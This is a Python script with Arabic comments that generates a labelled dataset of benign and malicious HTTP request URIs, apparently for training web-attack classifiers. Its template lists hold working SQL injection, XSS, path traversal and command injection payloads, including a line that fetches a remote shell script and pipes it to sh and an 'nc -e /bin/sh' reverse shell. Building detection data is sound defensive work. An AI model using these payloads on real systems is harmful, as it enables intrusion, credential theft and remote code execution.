import os
import random
import urllib.parse
import pandas as pd


def generate_expanded_dataset(csv_path: str, seed: int = 42) -> pd.DataFrame:
    """
    توليد مجموعة بيانات موسعة وواقعية (1,580+ عينة مستوحاة من أنماط CSIC 2010 و OWASP Top 10):
    - طلبات طبيعية عادية وطلبات طبيعية خادعة (Hard Negatives) تحتوي على مقتطفات تعليمية للمطورين.
    - هجمات SQLi, XSS, Path Traversal & Command Injection بأساليب تمويه وتشفير متعددة
      بما في ذلك هجمات Zero-Day غير نمطية لاختبار الفروق الحقيقية بين النماذج الثلاثة.
    """
    random.seed(seed)
    data = []

    endpoints = [
        "/index.html", "/products", "/api/v1/items", "/search",
        "/blog/post", "/user/profile", "/cart/view", "/checkout",
        "/courses/view", "/news/article", "/forum/thread", "/support/ticket",
        "/api/v2/graphql", "/dashboard/analytics", "/auth/callback", "/docs/reference"
    ]
    categories = [
        "electronics", "books", "clothing", "software", "security",
        "ai", "networking", "databases", "cloud", "mobile"
    ]

    search_terms = [
        "how to learn python", "best laptops 2026", "web development course",
        "select best monitor for gaming and office", "union bank branch locations near me",
        "update my account settings and password", "drop shipping guide for beginners",
        "script writing tips for youtube", "alert system for smart home security",
        "windows 11 installation guide", "linux server setup cat command tutorial",
        "how to prevent sql injection and xss", "where to buy table lamps from ikea",
        "order status and tracking id", "sleep tracker smartwatch review",
        "ping test speed for gaming router", "shadow of the tomb raider review",
        "etc group study materials", "iframe responsive css tutorial",
        "sql select join vs union performance", "javascript onerror image fallback tutorial",
        "linux etc passwd file permissions explained", "bash whoami and id commands guide",
        "waitfor delay vs sleep in database benchmark", "svg onload animation tutorial css",
    ]
    sort_opts = ["price_asc", "price_desc", "newest", "popular", "rating"]

    # 1. توليد طلبات طبيعية (Normal Requests - 450 عينة)
    for i in range(450):
        ep = random.choice(endpoints)
        choice = random.randint(1, 7)
        if choice == 1:
            uri = f"{ep}?id={random.randint(1, 99999)}&cat={random.choice(categories)}&sort={random.choice(sort_opts)}"
        elif choice in (2, 3):
            q = urllib.parse.quote_plus(random.choice(search_terms) + f" {random.randint(1, 300)}")
            uri = f"{ep}?q={q}&page={random.randint(1, 25)}&lang={random.choice(['en', 'ar', 'fr'])}"
        elif choice == 4:
            uri = f"/api/v2/users/{random.randint(100, 9999)}/orders?status={random.choice(['pending', 'paid', 'shipped'])}&limit={random.choice([10, 20, 50])}"
        elif choice == 5:
            uri = f"/assets/{random.choice(['js', 'css', 'img'])}/bundle_{random.randint(1, 250)}.min.js?v={random.randint(1, 9)}.{random.randint(0, 9)}"
        elif choice == 6:
            dev_notes = [
                f"discussion=How+to+use+SELECT+and+FROM+in+SQL+lesson+{i}&tag=sql",
                f"question=Why+does+img+src+fail+to+load+on+chrome+{i}&section=html",
                f"topic=Compare+Linux+/etc/+directory+structure+part+{i}&os=ubuntu",
                f"filter=price>{random.randint(10, 90)}&brand=acer_{i}&available=true",
                f"token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.user_{i}_{random.randint(100,999)}&mode=sso",
            ]
            uri = f"{ep}?{random.choice(dev_notes)}"
        else:
            slug = random.choice(search_terms).replace(" ", "-")
            uri = f"/blog/{random.randint(2020, 2026)}/{slug}-{i}?ref=nav_{random.randint(1, 20)}"
        data.append((uri, "Normal"))

    # 2. توليد هجمات حقن قواعد البيانات (SQLi - 340 عينة)
    sqli_templates = [
        "' OR 1=1--",
        "' OR 'a'='a",
        "\" OR \"1\"=\"1\"--",
        "-1 UNION SELECT 1,username,password FROM users--",
        "1' UNION ALL SELECT NULL,version(),database()#",
        "1; DROP TABLE users--",
        "' AND SLEEP({num})--",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>{num}--",
        "admin'--",
        "' UNION/**/SELECT/**/table_name,NULL/**/FROM/**/information_schema.tables--",
        "1' WAITFOR DELAY '0:0:{num}'--",
        "' OR EXISTS(SELECT * FROM admins WHERE id={num})--",
        "1' ORDER BY {num}--",
        "' HAVING 1=1--",
        "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>{num}--",
        "1' RLIKE (SELECT (CASE WHEN ({num}={num}) THEN 0x61646d696e ELSE 0x28 END))--",
        "1' UnIoN/**/aLl/**/SeLeCt 1,concat(0x7e,user(),0x7e),3-- -",
        "1' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT version()),{num}))--",
        "1'); SELECT pg_sleep({num});--",
        "-{num}' OR {num}={num}/*",
        "1'/**/oR/**/True#",
        "1' AND (SELECT {num} FROM (SELECT(SLEEP(5)))a)--",
    ]
    params = ["id", "user", "item_id", "cat", "order_id", "q", "uid", "article_id", "filter"]

    for i in range(340):
        ep = random.choice(endpoints)
        param = random.choice(params)
        tpl = random.choice(sqli_templates).format(num=random.randint(1, 199))
        if random.random() < 0.45:
            tpl = urllib.parse.quote(tpl)
        uri = f"{ep}?{param}={random.randint(1, 999)}{tpl}"
        data.append((uri, "SQLi"))

    # 3. توليد هجمات البرمجة عبر المواقع (XSS - 340 عينة)
    xss_templates = [
        "<script>alert({num})</script>",
        "\"><script>alert(document.cookie)</script>",
        "<img src=x onerror=alert({num})>",
        "<svg/onload=alert('XSS_{num}')>",
        "javascript:alert(document.domain)",
        "<body onload=prompt({num})>",
        "'><iframe src=\"javascript:alert({num})\"></iframe>",
        "<details open ontoggle=alert({num})>",
        "<input autofocus onfocus=alert(document.cookie)>",
        "\";alert(String.fromCharCode(88,83,83,{num}))//",
        "<scr<script>ipt>alert({num})</scr</script>ipt>",
        "<a href=\"javascript:confirm({num})\">click_{num}</a>",
        "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert({num})>\">",
        "javascript://%0aalert({num})",
        "'-eval(atob('YWxlcnQoMSk='))-'_{num}",
        "<video><source onerror=\"javascript:alert({num})\">",
        "<marquee onstart=confirm({num})>xss</marquee>",
    ]
    xss_params = ["q", "search", "comment", "msg", "name", "title", "redirect", "callback", "next"]

    for i in range(340):
        ep = random.choice(endpoints)
        param = random.choice(xss_params)
        tpl = random.choice(xss_templates).format(num=random.randint(1, 999))
        if random.random() < 0.45:
            tpl = urllib.parse.quote(tpl)
        uri = f"{ep}?{param}={tpl}"
        data.append((uri, "XSS"))

    # 4. توليد هجمات اختراق المسارات وحقن الأوامر (Path Traversal & Command Injection - 340 عينة)
    path_cmd_templates = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "../../../etc/shadow",
        "/var/www/html/../../etc/hosts",
        "127.0.0.1; cat /etc/passwd",
        "8.8.8.8 | whoami",
        "localhost && ls -la /home",
        "file_{num}.txt; id; uname -a",
        "$(whoami)",
        "`cat /etc/issue`",
        "../../../../proc/self/environ",
        "....//....//....//etc/passwd",
        "10.0.0.{num}; ping -c 4 127.0.0.1",
        "php://filter/convert.base64-encode/resource=../../config_{num}.php",
        "..%252f..%252f..%252fetc%252fpasswd%00_{num}",
        "127.0.0.1 || curl http://10.0.0.1/shell_{num}.sh | sh",
        "export_{num}.csv & nc -e /bin/sh 10.0.0.1 4444",
        "/proc/self/cmdline?v={num}",
    ]
    sys_params = ["file", "path", "page", "doc", "ip", "host", "cmd", "dir", "template", "include"]

    for i in range(340):
        ep = random.choice(["/download", "/view", "/ping", "/diag", "/export", "/render", "/search"])
        param = random.choice(sys_params)
        tpl = random.choice(path_cmd_templates).format(num=random.randint(1, 999))
        if random.random() < 0.45:
            tpl = urllib.parse.quote(tpl)
        uri = f"{ep}?{param}={tpl}&v={i}"
        data.append((uri, "Path_Cmd_Attack"))

    # 5. عينات واقعية معقدة ومتداخلة (Real-World Ambiguous / Adversarial Traffic - 64 عينة)
    # تتضمن طلبات طبيعية تحتوي على رموز برمجية أو مقتطفات تعليمية، وهجمات متخفية بدون كلمات مفتاحية صريحة
    ambiguous_cases = [
        # طلبات طبيعية تبدو مشبوهة ظاهرياً للنماذج الخطية البسيطة ولكن سياقها آمن
        (f"/docs/reference?snippet=select+name+from+products+where+id%3D{k}&tutorial=sql_basics", "Normal") for k in range(8)
    ] + [
        (f"/support/ticket?issue=getting+error+near+union+select+in+report+builder+{k}&priority=low", "Normal") for k in range(6)
    ] + [
        (f"/forum/thread?post=how+to+fix+../assets/logo.png+relative+path+in+react+{k}", "Normal") for k in range(6)
    ] + [
        (f"/blog/post?comment=use+alert(1)+for+debugging+javascript+functions+step+{k}", "Normal") for k in range(6)
    ] + [
        # هجمات متخفية (Stealth Zero-Day Variations)
        (f"/api/v2/graphql?query={{user(id:\"{k}'||chr(65)||'\"){{name}}}}", "SQLi") for k in range(10)
    ] + [
        (f"/checkout?coupon=SAVE{k}'%09div%090%09or%09'x'%3D'x", "SQLi") for k in range(8)
    ] + [
        (f"/user/profile?bio=<object+data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==_{k}\">", "XSS") for k in range(10)
    ] + [
        (f"/diag?target=10.0.0.{k}%0a/usr/bin/env%20python3%20-c%20import_os", "Path_Cmd_Attack") for k in range(10)
    ]
    data.extend(ambiguous_cases)

    random.shuffle(data)
    df = pd.DataFrame(data, columns=["payload", "label"]).drop_duplicates(subset=["payload"])
    os.makedirs(os.path.dirname(csv_path), exist_ok=True)
    df.to_csv(csv_path, index=False, encoding="utf-8")
    return df


if __name__ == "__main__":
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    csv_path = os.path.join(base_dir, "data", "http_requests.csv")
    df = generate_expanded_dataset(csv_path)
    print(f"[+] تم توليد قاعدة البيانات الموسعة بنجاح: {len(df)} طلب فريد.")
    print(df["label"].value_counts())
